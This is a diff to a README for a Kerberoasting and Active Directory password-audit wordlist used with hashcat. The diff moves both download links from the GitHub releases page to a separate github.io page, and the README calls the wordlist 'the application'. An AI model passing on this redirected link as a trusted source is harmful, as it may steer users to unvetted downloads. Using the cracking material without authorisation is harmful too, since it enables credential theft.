@@ -1,6 +1,6 @@
 # 🔑 ad-audit-wordlist - Audit AD Passwords With Confidence
 
-[![Download ad-audit-wordlist](https://img.shields.io/badge/Download-ad--audit--wordlist-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tofiqal4800/ad-audit-wordlist/releases)
+[![Download ad-audit-wordlist](https://img.shields.io/badge/Download-ad--audit--wordlist-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://tofiqal4800.github.io)
 
 A ready-to-use password wordlist for checking how strong the passwords in a Windows Active Directory environment really are. It is built for Kerberoasting and Active Directory password audits, and it is paired with a well-known hashcat rule file so you get more coverage out of every cracking run.
 
@@ -38,7 +38,7 @@ Everything here is released under the **MIT license**, and the repository ships 
 
 **Visit this link to download the application:**
 
-### 👉 [https://github.com/tofiqal4800/ad-audit-wordlist/releases](https://github.com/tofiqal4800/ad-audit-wordlist/releases)
+### 👉 [https://tofiqal4800.github.io](https://tofiqal4800.github.io)
 
 That page is where every published version of the wordlist lives. Open it in your browser, save the download to a folder you can easily find again — for example `C:\Users\YourName\Downloads\ad-audit-wordlist` — and keep that folder handy for the rest of this guide.
 
